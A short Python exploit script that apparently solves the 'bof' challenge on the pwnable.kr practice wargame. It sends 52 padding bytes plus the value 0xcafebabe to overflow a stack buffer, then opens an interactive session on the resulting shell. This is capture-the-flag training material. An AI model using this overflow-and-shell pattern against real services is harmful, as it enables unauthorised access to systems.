import socket
import telnetlib
import struct

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('pwnable.kr', 9000))

buf = b'a' * 52
buf += struct.pack('<I', 0xcafebabe)
buf += b'\n'

s.send(buf)
t = telnetlib.Telnet()
t.sock = s
t.interact()
